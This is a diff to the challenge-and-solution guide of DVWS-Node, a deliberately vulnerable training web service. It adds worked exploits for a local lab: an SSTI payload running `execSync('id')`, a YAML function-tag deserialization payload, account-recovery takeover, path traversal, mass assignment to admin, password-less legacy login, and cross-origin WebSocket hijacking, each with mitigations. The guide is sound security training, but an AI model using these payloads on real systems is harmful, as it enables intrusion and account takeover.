@@ -55,6 +55,19 @@ Damn Vulnerable Web Service (DVWS-Node) is a deliberately insecure web applicati
 35. [GraphQL Batching Brute Force](#35-graphql-batching-brute-force)
 36. [GraphQL Sensitive Data Exposure](#36-graphql-sensitive-data-exposure)
 37. [Unrestricted File Upload](#37-unrestricted-file-upload)
+38. [Role-Based Profile Data Exposure](#38-role-based-profile-data-exposure)
+39. [Account Recovery IDOR Chain](#39-account-recovery-idor-chain)
+40. [Session Revocation After Password Change](#40-session-revocation-after-password-change)
+41. [Cookie Security and Cross-Site Behavior](#41-cookie-security-and-cross-site-behavior)
+42. [JSONP Cross-Origin Data Exposure](#42-jsonp-cross-origin-data-exposure)
+43. [Cross-Site WebSocket Hijacking](#43-cross-site-websocket-hijacking)
+44. [Server-Side Template Injection](#44-server-side-template-injection)
+45. [Unsafe YAML Supplier Import](#45-unsafe-yaml-supplier-import)
+46. [Cached Monthly Report Path Traversal](#46-cached-monthly-report-path-traversal)
+47. [Notification Preference Mass Assignment](#47-notification-preference-mass-assignment)
+48. [Undocumented TRACE Diagnostics](#48-undocumented-trace-diagnostics)
+49. [Legacy Login Skips Password Verification](#49-legacy-login-skips-password-verification)
+50. [Excessive Activity Report Page Size](#50-excessive-activity-report-page-size)
 
 ---
 
@@ -154,7 +167,7 @@ The semicolon terminates the first command and `cat /etc/passwd` executes as a s
 
 **Endpoint:** `POST /dvwsuserservice`
 
-**Description:** The SOAP service parses XML with `libxmljs2` using `noent: true` and `dtdload: true`, enabling external entity resolution.
+**Description:** The SOAP service deliberately resolves external XML entities before parsing the request, enabling file read through XXE.
 
 ### Challenge
 
@@ -194,7 +207,7 @@ The contents of `/etc/passwd` are returned in the `<username>` field of the SOAP
 
 **Endpoint:** `POST /api/v2/notes/import/xml`
 
-**Description:** The XML notes import parses XML with `noent: true`, `dtdload: true`, and `huge: true`, disabling parser size limits.
+**Description:** The XML notes import deliberately expands internal and external entities before parsing XML. Nested entities can consume large amounts of memory.
 
 ### Challenge
 
@@ -215,7 +228,7 @@ Content-Type: application/json
 }
 ```
 
-The `huge: true` flag removes parser safety limits, allowing memory exhaustion.
+The unbounded entity expansion can exhaust memory.
 
 **XXE variant (file read via notes import):**
 
@@ -369,9 +382,9 @@ The filter becomes `(uid=admin)(objectClass=*)` which triggers verbose output in
 
 ## 10. Path Traversal
 
-**Endpoint:** `POST /api/download`
+**Endpoint:** `POST /api/download` (the `/download` route in `src/routes/files.js`, mounted under `/api` by the server)
 
-**Description:** The `filename` parameter is passed to `path.resolve()` without sanitization, allowing directory traversal.
+**Description:** This endpoint requires a valid bearer token. It combines the token's username with `public/uploads/<username>/`, then passes the supplied `filename` through `path.resolve()` without restricting the result to that directory. Traversal sequences can therefore reach files outside the upload folder.
 
 ### Challenge
 
@@ -390,7 +403,7 @@ Content-Type: application/json
 }
 ```
 
-The `../` sequences escape the upload directory and `path.resolve()` resolves them to an absolute path, allowing arbitrary file reads.
+Replace `<token>` with a valid login token. The `filename` is resolved relative to `public/uploads/<your-username>/`; enough `../` segments escape that folder. The endpoint sends the resolved file as a download.
 
 ---
 
@@ -1238,6 +1251,34 @@ Response:
 
 The bcrypt hash is returned alongside the valid JWT token.
 
+### 36a. Role-blind GraphQL data access
+
+**Endpoint:** `POST /graphql` (queries: `userSearchByUsername`, `userFindbyId`)
+
+**Why a basic scanner may miss the impact:** The requests return valid GraphQL responses. The flaw becomes clear when you compare what an anonymous caller, a regular user, and an admin can access against the application's intended permissions.
+
+### Challenge
+
+Assume users should only see their own account details, admins may look up other users, and password hashes should never be returned. Check whether the API follows those rules.
+
+### Solution
+
+First, look up an account ID without signing in:
+
+```json
+{"query":"{ userSearchByUsername(username: \"admin\") { id username admin } }"}
+```
+
+Use the returned ID to query the account, still without an `Authorization` header:
+
+```json
+{"query":"{ userFindbyId(id: \"<account-id>\") { id username password admin } }"}
+```
+
+The API returns the account's password hash and admin status. Repeat the query with a regular user's token and with an ID belonging to another user. The resolver does not check the caller's role or ownership, so anonymous and regular users can read those fields for other accounts.
+
+This is an authorization and data-exposure flaw: a scanner can confirm that the requests work, but a person must know which fields and accounts each role is allowed to access to judge the impact.
+
 ---
 
 ## 37. Unrestricted File Upload
@@ -1272,6 +1313,364 @@ The file is saved to `/public/uploads/<username>/malicious.xml` and is directly 
 
 ---
 
+## 38. Role-Based Profile Data Exposure
+
+**Endpoint:** `GET /api/v2/users/:id/profile-details`
+
+**Description:** The endpoint should show private contact details only when the caller is an administrator. It mistakenly checks whether the *profile owner* is an administrator. Any signed-in user can therefore see the email address and home address on the admin account's profile.
+
+### Challenge
+
+Compare what a regular user and an admin can see when requesting the same profiles. Which account's role controls whether private fields appear?
+
+### Solution
+
+Sign in as `test` and `admin` using `POST /api/v2/login`, with these JSON bodies:
+
+```json
+{"username":"test","password":"test"}
+{"username":"admin","password":"letmein"}
+```
+
+Use the returned tokens for the requests below. Use a GraphQL query to find the admin account ID:
+
+```json
+{"query":"{ userSearchByUsername(username: \"admin\") { id username } }"}
+```
+
+Request the admin profile using the `test` account's token:
+
+```
+GET /api/v2/users/<admin-id>/profile-details HTTP/1.1
+Host: dvws.local
+Authorization: Bearer <test-user-token>
+```
+
+The response includes `email` and `homeAddress`, even though the caller is not an admin. Request the `test` profile with the admin token and those fields are absent. The code checks the profile owner's `admin` value instead of the caller's permissions. A scanner may report successful responses, but recognizing the role mismatch requires knowing the intended access rules.
+
+---
+
+## 39. Account Recovery IDOR Chain
+
+**UI:** Account → Recovery
+**Endpoints:** `POST /api/v2/account-recovery/lookup`, `POST /api/v2/account-recovery/reset`, `GET /api/v2/users/profile`
+
+**Description:** The recovery lookup reveals a user's database ID from their email address. The reset endpoint accepts that ID and a new password without checking account ownership or proof of recovery. An attacker can chain these flaws to take over an account and read its profile data.
+
+### Challenge
+
+Sign in as `test`, open Account → Recovery, and use the account recovery workflow to take over the seeded customer account and view its synthetic profile details. Change the recovery target in the request.
+
+**Seeded account:** `recovery-victim` / `victim@dvws.local`
+
+### Solution
+
+Start with an authenticated session and submit an email to the lookup endpoint:
+
+```http
+POST /api/v2/account-recovery/lookup HTTP/1.1
+Host: dvws.local
+Authorization: Bearer <token>
+Content-Type: application/json
+
+{"email":"victim@dvws.local"}
+```
+
+The response includes the matching account's `userId`. Pass that ID and a new password to the reset endpoint:
+
+```http
+POST /api/v2/account-recovery/reset HTTP/1.1
+Host: dvws.local
+Authorization: Bearer <token>
+Content-Type: application/json
+
+{"userId":"<victim-id>","newPassword":"new-password"}
+```
+
+Sign in as `recovery-victim` with the new password, then open Account or call `/api/v2/users/profile` to see the account's fictional email and address. Both API endpoints require a valid token, but neither verifies that the caller owns the account being recovered.
+
+
+### Defense Exercise
+
+Describe or implement recovery-specific defenses: require a random, single-use, expiring token bound to the target account; rate-limit recovery attempts; and revoke that account's existing sessions after a password change. Repeat the recovery requests and confirm an authenticated user cannot reset another account's password.
+
+## 40. Session Revocation After Password Change
+
+**UI:** Account → Password & sessions
+**Endpoints:** `POST /api/v2/session-lab/secondary-token`, `POST /api/v2/users/change-password`, `GET /api/v2/users/profile`
+
+**Description:** The Password and sessions section creates an additional JWT, changes the seeded account password, and uses that older token to read the profile. A password change updates the password but does not invalidate previously issued JWTs. The dedicated token endpoint leaves the existing login cookie untouched.
+
+**Seeded account:** `session-victim` / `Session123!` (reset the database seed to restore it)
+
+### Challenge
+
+Sign in as the seeded account, open Account → Password & sessions, and create an additional session. Change the password, then verify the additional session. Confirm that it still returns HTTP 200 from the profile endpoint. Then sign out and verify the old password no longer creates a new session.
+
+### Solution
+
+On Account → Password & sessions, create an additional session while signed in as `session-victim`. Enter `Session123!` as the current password and choose a new password. Select **Verify session** after the password update.
+
+The verification request is a `GET /api/v2/users/profile` with the JWT created before the password change in its `Authorization` header. It still receives HTTP 200 even though a new login with `Session123!` fails. The password was changed, but the previously issued JWT was not revoked.
+
+### Defense exercise
+
+Use short-lived access tokens with a revocation strategy, such as a per-user token version checked by the API or refresh-token rotation with revocation. Revoke all sessions after credential recovery or password changes, and verify that both existing and newly requested sessions follow the intended policy.
+
+## 41. Cookie Security and Cross-Site Behavior
+
+**UI:** Account → Session settings
+**Endpoints:** `POST /api/v2/cookie-lab/session`, `POST /api/v2/cookie-lab/action`
+
+**Description:** Issue a dedicated browser-session cookie with one of three profiles: Standard browser session (`HttpOnly` off, `Secure` off, `SameSite=Lax`), Cross-site compatible session (`HttpOnly`, `Secure`, `SameSite=None`), or Restricted browser session (`HttpOnly`, `Secure`, `SameSite=Strict`). A separate attacker-origin page attempts a harmless state change using browser-managed cookies. This workflow does not alter the app's `auth_token` or the existing CSRF behavior.
+
+### Browser setup
+
+Install and trust [mkcert](https://github.com/FiloSottile/mkcert), then from the repository create a local certificate (the output names match the optional compose overlay):
+
+```sh
+mkdir -p certs
+mkcert -cert-file certs/dev-cert.pem -key-file certs/dev-key.pem dvws.local attacker.test
+```
+
+Add `127.0.0.1 dvws.local attacker.test` to your hosts file, then start the local environment with:
+
+```sh
+docker compose -f docker-compose.yml -f docker-compose.tls.yml up --build
+```
+
+Open `https://dvws.local:8443`, sign in, and go to **Account → Session settings**. Issue each profile and compare its `Set-Cookie` response header and `document.cookie` behavior. Then manually open `https://attacker.test:8443/attacker-lab.html?challenge=cookie` in the same browser to compare whether the cross-site action receives the cookie. Modern browser third-party-cookie restrictions can affect the result. The default HTTP setup and ordinary app flows do not require this TLS overlay.
+
+### Challenge
+
+From **Account → Session settings**, issue each of the three profiles. For each response, record the `HttpOnly`, `Secure`, and `SameSite` attributes and whether `document.cookie` can read `cookie_lab`. With the Cross-site compatible session selected, open the attacker URL above manually and inspect its request to `POST /api/v2/cookie-lab/action`.
+
+### Solution
+
+The Standard browser session is readable by JavaScript because it has no `HttpOnly` attribute; its cookie is `SameSite=Lax` and not marked `Secure`. The Cross-site compatible session sends `HttpOnly; Secure; SameSite=None`, so `document.cookie` cannot read it, but a browser may attach it to the attacker-origin request under the local HTTPS setup. The Restricted browser session sends `HttpOnly; Secure; SameSite=Strict`, so it is not JavaScript-readable and is not sent for that cross-site request.
+
+The attacker fixture is intentionally not linked in the application. Open `https://attacker.test:8443/attacker-lab.html?challenge=cookie` manually after selecting the Cross-site compatible session. If the browser permits third-party cookies, its request changes the isolated cookie-lab notification state without a CSRF token. Browser privacy settings can block this behavior.
+
+### Defense exercise
+
+Keep session cookies `HttpOnly` and `Secure`; choose `SameSite` to match the application's cross-site needs and use a CSRF token or equivalent request validation for state changes. HttpOnly limits script access to the cookie but does not stop the browser sending it automatically.
+
+## 42. JSONP Cross-Origin Data Exposure
+
+**UI:** Account → External access
+**Endpoints:** `POST /api/v2/jsonp-lab/session`, `GET /api/v2/jsonp-lab/profile?callback=captureProfile`
+
+**Description:** An authenticated account creates a short-lived, HttpOnly cross-site session. The endpoint returns a synthetic profile wrapped in a JavaScript callback. The second-origin fixture includes that endpoint as a script and reads the callback data, demonstrating why JSONP is unsuitable for sensitive responses.
+
+### Challenge
+
+Using the local HTTPS setup in challenge 41, sign into DVWS Cloud and select **Account → External access**. Enable the temporary sharing session and compare its `Set-Cookie` response header and `document.cookie` behavior. Then manually open `https://attacker.test:8443/attacker-lab.html?challenge=jsonp` in the same browser. Observe that the embedding page receives the callback data even though JavaScript cannot read the HttpOnly cookie directly. Try changing the callback to an invalid value and review the endpoint response.
+
+### Solution
+
+The temporary session sends a dedicated `jsonp_lab_session` cookie with `HttpOnly; Secure; SameSite=None`, so `document.cookie` cannot read it. `HttpOnly` does not stop the browser from attaching that cookie to a qualifying request. When the attacker page includes the authenticated endpoint as a cross-origin script, the response is executable JavaScript and invokes the attacker page's callback with the synthetic profile data. This is why an HttpOnly cookie alone does not protect sensitive data exposed through JSONP.
+
+### Defense exercise
+
+Do not expose sensitive data through JSONP. Return JSON and apply a narrowly scoped CORS policy when cross-origin access is required. Keep authenticated responses out of shared caches and apply authorization at the data endpoint.
+
+## 43. Cross-Site WebSocket Hijacking
+
+**UI:** Account → Notifications
+**Endpoints:** `GET /api/v2/notifications`, `PUT /api/v2/notifications/:id/read`, `wss://dvws.local:8443/ws/notifications`
+
+**Description:** Account has a persistent per-account inbox and a live notification feed. The socket authenticates using the normal `auth_token` login cookie but deliberately does not validate the handshake Origin. An attacker origin can therefore read that account's notifications and mark them read.
+
+### Challenge
+
+Use the local HTTPS setup in challenge 41, sign into `https://dvws.local:8443`, and open Account → Notifications so the normal login cookie is present. From a page served at `https://attacker.test:8443`, run `new WebSocket('wss://dvws.local:8443/ws/notifications')` in the console and review the `snapshot` message. Send `JSON.stringify({ type: 'mark-read', id: '<notification id>' })` to alter an inbox item. Compare the handshake Origin with the missing Origin validation. This requires trusted local TLS and the two host mappings.
+
+Requests without a valid `auth_token` cookie are rejected with HTTP 401. On HTTPS the login cookie is `HttpOnly; Secure; SameSite=None`, allowing the browser to attach it during the cross-origin WebSocket handshake. The normal HTTP development server instead uses `HttpOnly; SameSite=Lax` without `Secure`; Account still works same-origin, but that setup does not claim a browser-faithful cross-origin exploit.
+
+## 44. Server-Side Template Injection
+
+**Endpoint:** `GET /api/v2/greeter?name=...`
+
+**Description:** The greeter compiles the supplied `name` query parameter as a JavaScript template literal. Expressions inside `${...}` are evaluated by the server.
+
+### Challenge
+
+Make the server evaluate a harmless expression, then inspect the rendering code and demonstrate why untrusted template source can lead to server-side code execution.
+
+### Solution
+
+Start with a harmless expression:
+
+```
+GET /api/v2/greeter?name=%24%7B7*7%7D
+```
+
+The response is `Hello 49`. The parameter is inserted into a newly compiled function as template source. For a controlled local lab, a command expression such as `${process.mainModule.require('child_process').execSync('id').toString()}` demonstrates the impact. Do not expose this deliberately vulnerable service to untrusted networks.
+
+**Mitigation:** Keep templates fixed and pass user input as escaped data. Never compile request values as template source.
+
+## 45. Unsafe YAML Supplier Import
+
+**Endpoint:** `POST /api/v2/integrations/supplier-orders/import`
+
+**Scenario:** A retailer accepts YAML order batches from a supplier integration. The importer supports an optional post-import hook, and its YAML schema permits executable function tags.
+
+### Challenge
+
+Upload a normal supplier order batch, then show that a tagged post-import hook executes during the import. Keep the demonstration local and use only the provided marker-file proof.
+
+### Solution
+
+Create `orders.yaml`:
+
+```yaml
+supplier: Northstar Components
+orders:
+  - sku: BRG-104
+    quantity: 12
+postImport: !js/function "require('fs').writeFileSync('/tmp/dvws-yaml-import-marker', 'executed')"
+```
+
+Upload it with a valid token:
+
+```sh
+curl -X POST http://dvws.local/api/v2/integrations/supplier-orders/import \
+  -H 'Authorization: Bearer <token>' \
+  -F 'file=@orders.yaml;type=text/yaml'
+```
+
+The response reports one imported order, and `/tmp/dvws-yaml-import-marker` contains `executed`. The function tag is deserialized and invoked as part of processing the batch.
+
+The example is non-destructive, but the vulnerable parser can execute arbitrary JavaScript; the marker path does not sandbox it. Run this challenge only in an isolated lab.
+
+**Mitigation:** Use a data-only YAML schema, reject custom executable tags, validate each imported field, and never invoke functions supplied by an uploaded document.
+
+## 46. Cached Monthly Report Path Traversal
+
+**Endpoint:** `GET /api/v2/reports/monthly?period=YYYY-MM`
+
+**Scenario:** An authenticated finance user requests a monthly exchange-rate report from a file cache. The API expects a year-month value but uses it directly to form the cache file path.
+
+### Challenge
+
+Retrieve the ordinary September report, then use path traversal to read the adjacent synthetic support summary outside the cache directory.
+
+### Solution
+
+```sh
+curl 'http://dvws.local/api/v2/reports/monthly?period=2026-09' \
+  -H 'Authorization: Bearer <token>'
+
+curl 'http://dvws.local/api/v2/reports/monthly?period=..%2Finternal%2Fsupport-summary' \
+  -H 'Authorization: Bearer <token>'
+```
+
+The second response includes `classification: "internal training data"`. The file is a synthetic fixture in this repository; no host files or real customer records are involved.
+
+**Mitigation:** Validate the period against a strict format, resolve the candidate path, and verify it remains beneath the cache directory before reading it.
+
+## 47. Notification Preference Mass Assignment
+
+**Endpoint:** `PUT /api/v2/users/notification-preferences`
+
+**Scenario:** A signed-in customer updates the email address and weekly digest setting used by notification delivery. The API copies every submitted field onto the account record, including fields outside the settings form.
+
+### Challenge
+
+Update ordinary notification settings, then add the account's `admin` field to the same request. Sign in again and inspect the permissions in the new token.
+
+### Solution
+
+```http
+PUT /api/v2/users/notification-preferences HTTP/1.1
+Host: dvws.local
+Authorization: Bearer <customer-token>
+Content-Type: application/json
+
+{"email":"alerts@example.test","weeklyDigest":true,"admin":true}
+```
+
+The response shows `admin: true`. Log in again as that customer and request `/api/v2/users/checkadmin`; the new token has the administrator permission. Existing tokens retain the claims issued at login.
+
+**Mitigation:** Build updates from an allowlist of notification fields and keep role changes in a separately authorized workflow.
+
+## 48. Undocumented TRACE Diagnostics
+
+**Endpoint:** `TRACE /internal/diagnostics` (intentionally absent from the front end and OpenAPI document)
+
+**Scenario:** A developer leaves an internal diagnostics handler enabled after investigating account import failures. It returns operational metadata and account contact fields to anyone who can reach the service.
+
+### Challenge
+
+Discover the hidden route and HTTP method, then inspect what information the handler returns. Compare it with the published OpenAPI paths.
+
+### Solution
+
+```sh
+curl -X TRACE http://dvws.local/internal/diagnostics
+```
+
+The response includes a build label, database connection state, and seeded account usernames, email addresses, and roles. The path does not appear in `/openAPI-spec.json`; method and path discovery therefore require inspecting the service behavior or source.
+
+**Mitigation:** Remove diagnostics handlers from public builds or require explicit operator authorization, and keep diagnostic output free of account data.
+
+## 49. Legacy Login Skips Password Verification
+
+**Endpoint:** `POST /api/v1/login` (intentionally absent from OpenAPI)
+
+**Scenario:** A legacy login handler looks up a user by username and issues a normal JWT without checking the submitted password. The browser continues to use the v2 login route.
+
+### Challenge
+
+Submit an incorrect password for the seeded `test` account to both login versions. Use any token returned by v1 to read a protected v2 endpoint. Try an unknown username as a control.
+
+### Solution
+
+```sh
+curl -X POST http://dvws.local/api/v2/login \
+  -H 'Content-Type: application/json' \
+  -d '{"username":"test","password":"wrong-password"}'
+
+curl -X POST http://dvws.local/api/v1/login \
+  -H 'Content-Type: application/json' \
+  -d '{"username":"test","password":"wrong-password"}'
+
+curl http://dvws.local/api/v2/notes \
+  -H 'Authorization: Bearer <token-from-v1-login>'
+```
+
+V2 returns HTTP 401. V1 returns HTTP 200 and a token that can access the notes endpoint. An unknown username returns HTTP 404 from v1.
+
+**Mitigation:** Require password verification on every authentication path and retire the legacy handler. Test all supported login versions against incorrect credentials.
+
+## 50. Excessive Activity Report Page Size
+
+**Endpoint:** `GET /api/v2/reports/activity?limit=N`
+
+**Scenario:** An authenticated report API returns synthetic activity records. It defaults to 20 but accepts up to 5,000 in a single response, making one request substantially larger than the ordinary page.
+
+### Challenge
+
+Request the report with and without `limit=5000`, then compare the record counts and response sizes. A token is required.
+
+### Solution
+
+```sh
+curl -s 'http://dvws.local/api/v2/reports/activity' \
+  -H 'Authorization: Bearer <token>' -o default.json
+
+curl -s 'http://dvws.local/api/v2/reports/activity?limit=5000' \
+  -H 'Authorization: Bearer <token>' -o large.json
+
+wc -c default.json large.json
+```
+
+The responses contain 20 and 5,000 records respectively. The records are deterministic synthetic data. Invalid, nonpositive, and above-5,000 limits return HTTP 400; the ceiling is a lab safety bound.
+
+**Mitigation:** Enforce a small page-size cap, paginate results, and set response or resource budgets for expensive report operations.
+
+---
+
 ## Appendix: Quick Reference
 
 ### Endpoints by Vulnerability Category
@@ -1279,11 +1678,18 @@ The file is saved to `/public/uploads/<username>/malicious.xml` and is directly 
 | Category | Endpoints |
 |----------|-----------|
 | **Injection** | `/api/v2/passphrase`, `/api/v2/notesearch`, `/api/v2/sysinfo/:cmd`, `/dvwsuserservice`, `/api/v2/release/:r`, `/api/v2/users/ldap-search` |
-| **Broken Auth** | All authenticated endpoints (JWT none/weak secret) |
-| **Data Exposure** | `/api/v1/info`, `/api/v2/users`, `/graphql` (userLogin, userFindbyId) |
+| **Broken Auth** | All authenticated endpoints (JWT none/weak secret), `/api/v1/login`, `/api/v2/session-lab/secondary-token`, `/api/v2/users/change-password` |
+| **Data Exposure** | `/api/v1/info`, `/api/v2/users`, `/api/v2/users/:id/profile-details`, `/api/v2/users/profile`, `/api/v2/account-recovery/lookup`, `/graphql` (userLogin, userSearchByUsername, userFindbyId) |
 | **XXE/XML** | `/dvwsuserservice`, `/api/v2/notes/import/xml`, `/api/v2/users/profile/export/xml`, `/api/v2/users/profile/import/xml` |
-| **Access Control** | `/api/v2/notes/:id`, `/api/v2/passphrase/:user`, `/api/v2/sysinfo/:cmd`, `/api/v2/users` |
+| **Access Control** | `/api/v2/notes/:id`, `/api/v2/passphrase/:user`, `/api/v2/sysinfo/:cmd`, `/api/v2/users`, `/api/v2/users/:id/profile-details`, `/api/v2/account-recovery/lookup`, `/api/v2/account-recovery/reset` |
 | **SSRF** | `/xmlrpc` (dvws.CheckUptime) |
 | **RCE** | `/api/v2/export` (deserialization), `/api/v2/sysinfo/:cmd` (command injection) |
-| **Client-Side** | CORS (all endpoints), CSRF (`/api/v2/admin/create-user`), XSS (various) |
+| **Client-Side** | CORS (all endpoints), CSRF (`/api/v2/admin/create-user`, `/api/v2/cookie-lab/action`), XSS (various), JSONP (`/api/v2/jsonp-lab/profile`) |
+| **WebSocket** | Cross-Site WebSocket Hijacking (`/ws/notifications`) |
+| **Resource Consumption** | `/api/v2/reports/activity` |
 | **GraphQL** | `/graphql` (introspection, IDOR, file write, batching, data exposure) |
+| **Template Injection** | `/api/v2/greeter` |
+| **Unsafe Deserialization** | `/api/v2/integrations/supplier-orders/import` (YAML function tag) |
+| **Path Traversal** | `/api/download`, `/api/v2/reports/monthly` |
+| **Mass Assignment** | `/api/v2/users`, `/api/v2/users/profile/import/xml`, `/api/v2/users/notification-preferences` |
+| **Hidden Endpoint** | `TRACE /internal/diagnostics` |
